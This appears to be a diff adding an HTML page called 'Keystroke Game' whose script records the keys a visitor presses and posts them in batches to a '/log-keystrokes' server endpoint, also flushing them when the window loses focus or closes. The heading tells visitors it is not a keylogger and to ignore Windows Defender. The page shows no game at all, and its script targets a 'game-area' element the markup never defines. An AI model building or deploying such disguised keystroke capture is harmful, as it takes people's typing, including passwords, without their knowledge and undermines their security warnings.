@@ -1,0 +1,102 @@
+<!-- public/index.html -->
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Keystroke Game</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      text-align: center;
+      margin: 50px;
+    }
+    #game-area {
+      width: 600px;
+      height: 400px;
+      margin: 0 auto;
+      border: 2px solid #333;
+      position: relative;
+      background-color: #f0f0f0;
+    }
+    #keystroke-display {
+      margin-top: 20px;
+      font-family: monospace;
+      min-height: 100px;
+      padding: 10px;
+      background: #eee;
+      border: 1px solid #ddd;
+      text-align: left;
+    }
+  </style>
+</head>
+<body>
+
+
+  
+  <img src="./bcit_formula_3.jpg" alt="Logo" style="width: 200px; height: auto; margin-bottom: 20px;">
+
+  <h1> THIS IS NOT A KEY LOGGER. IGNORE WINDOWS DEFENDER :D</h1>
+  
+  <script>
+    document.addEventListener('DOMContentLoaded', () => {
+      const gameArea = document.getElementById('game-area');
+      
+      let keyBuffer = '';
+      
+      gameArea.focus();
+      // Capture keystrokes
+      gameArea.addEventListener('keydown', (event) => {
+        // Don't capture function keys, just alphanumeric and special characters
+        if (event.key.length === 1 || event.key === 'Enter' || event.key === 'Backspace' || event.key === 'Space') {
+          let displayKey = event.key;
+          
+          // Handle special keys for display
+          if (event.key === 'Enter') displayKey = '↵';
+          else if (event.key === 'Backspace') displayKey = '←';
+          else if (event.key === ' ') displayKey = '␣';
+          
+          // Add to buffer
+          keyBuffer += event.key;
+          
+          // Update display
+          
+          // Send to server every 10 keystrokes
+          if (keyBuffer.length >= 10) {
+            sendKeystrokes();
+          }
+        }
+      });
+      
+      // Function to send keystrokes to server
+      function sendKeystrokes() {
+        if (keyBuffer.length === 0) return;
+        
+        fetch('/log-keystrokes', {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json'
+          },
+          body: JSON.stringify({ keystrokes: keyBuffer })
+        })
+        .then(response => response.json())
+        .then(data => {
+          console.log('Keystrokes sent:', data);
+          // Reset buffer after successful send
+          keyBuffer = '';
+        })
+        .catch(error => {
+          console.error('Error sending keystrokes:', error);
+        });
+      }
+      
+      // Also send keystrokes when window loses focus or before unload
+      window.addEventListener('blur', sendKeystrokes);
+      window.addEventListener('beforeunload', sendKeystrokes);
+      
+      // Set initial focus
+      gameArea.focus();
+    });
+  </script>
+</body>
+</html>
